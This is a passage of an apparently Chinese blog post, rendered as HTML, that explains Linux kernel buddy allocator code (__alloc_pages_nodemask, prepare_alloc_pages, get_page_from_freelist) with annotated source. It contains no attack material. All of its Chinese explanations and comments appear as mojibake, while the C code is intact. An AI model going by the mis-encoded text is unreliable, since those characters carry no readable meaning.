class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_nodemask</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">preferred_nid</span>,</span><br><span class="hljs-class"><span class="hljs-title">nodemask_t</span> *<span class="hljs-title">nodemask</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags = ALLOC_WMARK_LOW;<br><span class="hljs-type">gfp_t</span> alloc_mask; <span class="hljs-comment">/* å®é™…ç”¨äºåˆ†é…çš„ gfp_t ï¼Œè¿™æ˜¯ä¸€ä¸ªintç±»å‹çš„æ•´å‹*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> <span class="hljs-title">ac</span> =</span> &#123; &#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å‡å®š order çš„å€¼åœ¨ä¸€äº›åœ°æ–¹æ˜¯æ­£å¸¸çš„ï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤è‹¥è¯·æ±‚è¶…å‡ºèŒƒå›´åˆ™æå‰é€€å‡º</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;<br>WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>gfp_mask &amp;= gfp_allowed_mask;<br>alloc_mask = gfp_mask;<br><span class="hljs-keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›´åˆ°æ‰€æœ‰çš„ local zone éƒ½è¢«è€ƒè™‘ä¹‹å‰ï¼Œ</span><br><span class="hljs-comment"> * ç¦æ­¢ä» falling back åˆ°å†…å­˜ç¢ç‰‡ç§ç±»çš„ç¬¬ä¸€æ¬¡ä¼ é€’</span><br><span class="hljs-comment"> */</span><br>alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);<br><br><span class="hljs-comment">/* ç¬¬ä¸€æ¬¡åˆ†é…å°è¯• */</span><br>page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);<br><span class="hljs-keyword">if</span> (likely(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åº”ç”¨ä½œç”¨åŸŸåˆ†é…çº¦æŸ è¿™ä¸»è¦ä¸ GFP_NOFS æœ‰å…³ã€‚</span><br><span class="hljs-comment"> * GFP_NOIO å¿…é¡»ä»ä¸€ä¸ªç‰¹å®šçš„ç”± memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span><br><span class="hljs-comment"> * æ‰€æ ‡è®°çš„ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰çš„åˆ†é…è¯·æ±‚ä¸­ç»§æ‰¿</span><br><span class="hljs-comment"> */</span><br>alloc_mask = current_gfp_context(gfp_mask);<br>ac.spread_dirty_pages = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ¢å¤æœ€åˆçš„ nodemask ï¼ˆå…¶å¯èƒ½è¢«æ›¿æ¢ä¸º &amp;cpuset_current_mems_allowed</span><br><span class="hljs-comment"> * ä»¥ä¼˜åŒ–å¿«é€Ÿï¼ˆåˆ†é…ï¼‰è·¯å¾„çš„å°è¯•ï¼‰</span><br><span class="hljs-comment"> */</span><br>ac.nodemask = nodemask;<br><br>page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);<br><br>out:<br><span class="hljs-keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;<br>    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="hljs-number">0</span>)) &#123;<br>__free_pages(page, order);<br>page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br>EXPORT_SYMBOL(__alloc_pages_nodemask);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„å…·ä½“æ­¥éª¤ä¸»è¦åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ul><li>æ£€æŸ¥å‚æ•°åˆæ³•æ€§ï¼Œå¹¶åšåˆ†é…å‰å‡†å¤‡å·¥ä½œ</li><li>è¿›è¡Œ<strong>å¿«é€Ÿåˆ†é…</strong>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›ç»“æœ</li><li>è‹¥å¿«é€Ÿåˆ†é…å¤±è´¥ï¼Œåˆ™è¿›è¡Œ<strong>æ…¢é€Ÿåˆ†é…</strong></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥å¿«é€Ÿåˆ†é…ä¸æ…¢é€Ÿåˆ†é…çš„å†…éƒ¨ç»†èŠ‚</p><h3 id="I-prepare-alloc-pages-ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#I-prepare-alloc-pages-ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="I. prepare_alloc_pages()ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ"></a>I. prepare_alloc_pages()ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ</h3><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯åšåˆ†é…å‰çš„ä¸€äº›å‡†å¤‡çš„å·¥ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ– <code>alloc_context</code> ç»“æ„ä½“ã€è·å– zone æ•°ç»„ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">prepare_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">int</span> preferred_nid, <span class="hljs-type">nodemask_t</span> *nodemask,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> alloc_context *ac, <span class="hljs-type">gfp_t</span> *alloc_mask,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *alloc_flags)</span><br>&#123;<br>ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);<br>ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="hljs-comment">// è·å– zonelist</span><br>ac-&gt;nodemask = nodemask;<br>ac-&gt;migratetype = gfp_migratetype(gfp_mask);<br><br>    <span class="hljs-comment">// è‹¥å¼€å¯äº† cpusetï¼ˆé™åˆ¶æŸä¸€ç»„è¿›ç¨‹åªè¿è¡Œåœ¨æŸäº›cpuå’Œå†…å­˜èŠ‚ç‚¹ä¸Šï¼‰ï¼Œåˆ™è®¾ç½®å¯¹åº”çš„æ ‡å¿—ä½ã€‚</span><br><span class="hljs-keyword">if</span> (cpusets_enabled()) &#123;<br>*alloc_mask |= __GFP_HARDWALL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­, åˆ™è¿™ä¸å½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡æ— å…³ã€‚</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€ä»»ä¸€ node éƒ½æ˜¯ ok çš„.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)<br>ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;<br><span class="hljs-keyword">else</span><br>*alloc_flags |= ALLOC_CPUSET;<br>&#125;<br><br>fs_reclaim_acquire(gfp_mask);<br>fs_reclaim_release(gfp_mask);<br><br>might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);<br><br><span class="hljs-keyword">if</span> (should_fail_alloc_page(gfp_mask, order))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);<br><br><span class="hljs-comment">/* Dirty zone çš„å¹³è¡¡ä»…åœ¨ fast path ä¸­å®Œæˆ */</span><br>ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * preferred zone è¢«ç”¨äºè¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼Œ ä½†éå¸¸é‡è¦çš„æ˜¯å…¶é¡µè¢«ç”¨ä½œ</span><br><span class="hljs-comment"> * zonelist è¿­ä»£å™¨çš„èµ·å§‹ç‚¹. å¯¹äºå¿½ç•¥å†…å­˜ç­–ç•¥çš„åˆ†é…ï¼Œå…¶å¯èƒ½ä¼šè¢«é‡ç½®ã€‚</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>é¦–å…ˆè°ƒç”¨ <code>node_zonelist()</code> ä» <code>preferred_nid</code> å‚æ•°æ‰€æŒ‡å®šçš„ node ä¸­è·å–ä¸€ä¸ª zonelistï¼Œå…¶å®å°±æ˜¯å– <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>è¿›è¡Œ cpuset ç›¸å…³åˆ¤æ–­ä¸æ ‡å¿—ä½è®¾ç½®ï¼Œè‹¥æ˜¯åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡åˆ™ç›´æ¥å°† nodemask è®¾ä¸º <code>cpuset_current_mems_allowed</code></li><li>æœ€åè°ƒç”¨ <code>first_zones_zonelist()</code> è®¾ç½® preferred zoneï¼Œå¤§æ¦‚æ˜¯åœ¨ zonelist ä¸­â†’nodemask æ‰€åŒ…å«çš„ zone ä¸­â†’ <code>highest_zoneidx</code> ä»¥ä¸‹çš„ç¬¬ä¸€ä¸ª zone</li></ul><blockquote><p>åæ­£æºç æ³¨é‡Šæ˜¯è¿™ä¹ˆå†™çš„hhh</p></blockquote><h3 id="II-get-page-from-freelist-ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰"><a href="#II-get-page-from-freelist-ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰" class="headerlink" title="II. get_page_from_freelist()ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰"></a>II. get_page_from_freelist()ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯éå†åˆ†é…ä¸Šä¸‹æ–‡å¯¹åº”çš„ zonelist ä¸­çš„ zone è¿›è¡Œå†…å­˜åˆ†é…ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_page_from_freelist éå† zonelist å°è¯•åˆ†é…é¡µé¢</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<br><span class="hljs-title function_">get_page_from_freelist</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order, <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> alloc_context *ac)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">z</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">last_pgdat_dirty_limit</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> no_fallback;<br><br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ‰«æ zonelist, å¯»æ‰¾æœ‰ç€è¶³å¤Ÿç©ºé—²é¡µé¢çš„ zone.</span><br><span class="hljs-comment"> * å‚è§ __cpuset_node_allowed() çš„æ³¨é‡Šï¼ˆkernel/cpuset.cï¼‰</span><br><span class="hljs-comment"> */</span><br>no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="hljs-comment">// é¿å…å†…å­˜ç¢ç‰‡çš„flag</span><br>z = ac-&gt;preferred_zoneref; <span class="hljs-comment">// å…ˆå°è¯•ä» preferred zone ä¸­åˆ†é…</span><br>    <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªå°è£…å®ï¼Œè¡¨ç¤ºä» z å¼€å§‹éå† zonelist ä¸­çš„ zoneref æ•°ç»„ï¼Œ</span><br>    <span class="hljs-comment">// å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</span><br>    <span class="hljs-comment">// åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„</span><br>    <span class="hljs-comment">// ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</span><br>for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,<br>ac-&gt;nodemask) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mark;<br><br>        <span class="hljs-comment">// å¼€å¯äº† cpuset ä¸” flag ä¸­æœ‰ ALLOC_CPUSET æ ‡å¿—ä½ï¼Œ</span><br>        <span class="hljs-comment">// ä½†æ˜¯ cpuset ä¸­ä¸å…è®¸ä»¥è¯¥ gfp_mask åœ¨è¯¥ zone ä¸­åˆ†é…ï¼Œ</span><br>        <span class="hljs-comment">// è¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£</span><br><span class="hljs-keyword">if</span> (cpusets_enabled() &amp;&amp;<br>(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;<br>!__cpuset_zone_allowed(zone, gfp_mask))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åœ¨åˆ†é…é¡µç¼“å­˜ï¼ˆpage cacheï¼‰é¡µä»¥è¿›è¡Œå†™å…¥æ—¶, æˆ‘ä»¬æƒ³è¦</span><br><span class="hljs-comment"> * åœ¨ä¸€ä¸ªèŠ‚ç‚¹çš„â€œè„é™åˆ¶â€ï¼ˆdirty limitï¼‰å†…è·å¾—ä»–, </span><br><span class="hljs-comment">         * ç”±æ­¤ï¼Œæ²¡æœ‰ä¸€ä¸ªèŠ‚ç‚¹æœ‰ç€è¶…è¿‡å…¨å±€å…è®¸çš„è„é¡µæ¯”ä¾‹ã€‚</span><br><span class="hljs-comment"> * è„é™åˆ¶è€ƒè™‘äº†èŠ‚ç‚¹çš„ä½ç«¯å†…å­˜ä¿ç•™å’Œé«˜æ°´ä½çº¿ï¼Œ</span><br><span class="hljs-comment"> * ä»¥ä¾¿äº kswapd èƒ½å¹³è¡¡å®ƒï¼Œè€Œä¸å¿…ä»å…¶ LRU åˆ—è¡¨ä¸­å†™å…¥é¡µé¢ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> ç°åœ¨, åœ¨è¿›å…¥å›æ”¶ä¹‹å‰ï¼Œ</span><br><span class="hljs-comment"> * å…è®¸åˆ†é…å¯èƒ½è¶…è¿‡ æ…¢é€Ÿè·¯å¾„ä¸­ (spread_dirty_pages unset)</span><br><span class="hljs-comment"> * å•èŠ‚ç‚¹çš„ dirty limitï¼Œè¿™åœ¨ä¸€ä¸ªå…è®¸èŠ‚ç‚¹ä»¬åœ¨ä¸€èµ·éƒ½æœªå¤Ÿå¤§ä»¥è¾¾åˆ°å…¨å±€é™åˆ¶</span><br><span class="hljs-comment">         * çš„ NUMA è®¾ç½®ä¸­æ˜¯å¾ˆé‡è¦çš„ã€‚å¯¹äºè¿™äº›æƒ…å†µçš„åˆé€‚çš„ä¿®è¡¥å°†éœ€è¦å¯¹</span><br><span class="hljs-comment"> * dirty-throttling ä¸ flusher threads ä¸­èŠ‚ç‚¹çš„æ„è¯†.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// è¯‘æ³¨ï¼šåŸæ–‡å°±æ˜¯XXXï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“è¿™ä¸ªXXXæ˜¯ä»€ä¹ˆ...</span><br>        <span class="hljs-comment">// å¤§æ¦‚å°±æ˜¯æ£€æŸ¥å½“å‰zoneå¯¹åº”nodeçš„è„é¡µæ•°é‡æ˜¯ä¸æ˜¯è¾¾åˆ°é™åˆ¶äº†</span><br><span class="hljs-keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;<br><span class="hljs-keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;<br>last_pgdat_dirty_limit = zone-&gt;zone_pgdat;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// node æ•°é‡å¤§äº1ï¼Œä¸”å½“å‰ zone å¹¶é preferred zone</span><br><span class="hljs-keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="hljs-number">1</span> &amp;&amp;<br>    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;<br><span class="hljs-type">int</span> local_nid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç§»åŠ¨åˆ°äº† remote nodeï¼ˆè¯‘æ³¨ï¼šéå½“å‰nodeï¼Ÿï¼‰, åˆ™é‡è¯•ï¼Œ</span><br><span class="hljs-comment"> * ä½†å…è®¸ fragmenting fallbacks. å±€éƒ¨æ€§æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦ã€‚</span><br><span class="hljs-comment"> */</span><br>            <span class="hljs-comment">// æ¯”å¯¹å½“å‰ zone æ˜¯å¦åœ¨ local nodeï¼ˆå°±æ˜¯ç¦»å½“å‰CPUæœ€è¿‘é‚£ä¸ª nodeï¼‰</span><br>            <span class="hljs-comment">// è‹¥å¦ï¼Œåˆ™å»æ‰ ALLOC_NOFRAGMENT æ ‡å¿—ä½ï¼Œå¹¶ä» preferred zone å¼€å§‹é‡è¯•ã€‚</span><br>            <span class="hljs-comment">// å³ï¼škernel æ›´å€¾å‘äºä¼˜å…ˆä» local zone è¿›è¡Œåˆ†é…ï¼Œå“ªæ€•ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</span><br>local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);<br><span class="hljs-keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</span><br>mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);<br><span class="hljs-keyword">if</span> (!zone_watermark_fast(zone, order, mark,<br>       ac-&gt;highest_zoneidx, alloc_flags,<br>       gfp_mask)) &#123; <span class="hljs-comment">// æ°´ä½çº¿ç›¸å…³æ“ä½œ</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¯¥ zone çš„æ°´ä½çº¿å¤±è´¥, ä½†è‹¥å…¶åŒ…å«äº† deferred pagesï¼Œ</span><br><span class="hljs-comment"> * åˆ™æˆ‘ä»¬ä¼šçœ‹è¯¥ zone æ˜¯å¦è¿˜èƒ½å†è¿›è¡Œæ‰©å±•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Checked here to keep the fast path fast */</span><br>BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);<br>            <span class="hljs-comment">// è¯¥æ ‡å¿—ä½æ„ä¸ºã€ä¸æ£€æŸ¥æ°´ä½çº¿ã€‘ï¼Œæ­¤æ—¶æˆ‘ä»¬ç›´æ¥å°è¯•ä»è¯¥ zone ä¸­åˆ†é…</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">if</span> (node_reclaim_mode == <span class="hljs-number">0</span> ||<br>    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))<br><span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// é¦–å…ˆè¿›è¡Œé¡µé¢å›æ”¶ï¼Œä¹‹åæŸ¥çœ‹æ˜¯å¦æ»¡è¶³æ°´ä½çº¿è¦æ±‚ï¼Œè‹¥â€˜</span><br>            <span class="hljs-comment">// ä¸æ‰«æ/æ²¡æœ‰å¯å›æ”¶/æ£€æŸ¥æœªé€šè¿‡</span><br>            <span class="hljs-comment">// åˆ™éƒ½ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ï¼Œå°è¯•ä¸‹ä¸€ä¸ª zone</span><br>ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_NOSCAN:<br><span class="hljs-comment">/* ä¸æ‰«æ */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_FULL:<br><span class="hljs-comment">/* æ‰«æäº†ä½†ä¸å¯å›æ”¶ */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å›æ”¶äº†è¶³å¤Ÿé¡µé¢ */</span><br><span class="hljs-keyword">if</span> (zone_watermark_ok(zone, order, mark,<br>ac-&gt;highest_zoneidx, alloc_flags))<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>try_this_zone:<br>        <span class="hljs-comment">// æ¥åˆ°è¯¥ label è¡¨ç¤ºæˆ‘ä»¬ç»ˆäºé€šè¿‡äº†å‰é¢ä¸€ç³»åˆ—çš„å„ç§æ£€æŸ¥ï¼Œç°åœ¨å¼€å§‹æ­£å¼è¿›è¡Œé¡µé¢åˆ†é…</span><br>        <span class="hljs-comment">// **************************</span><br>        <span class="hljs-comment">// rmqueue() 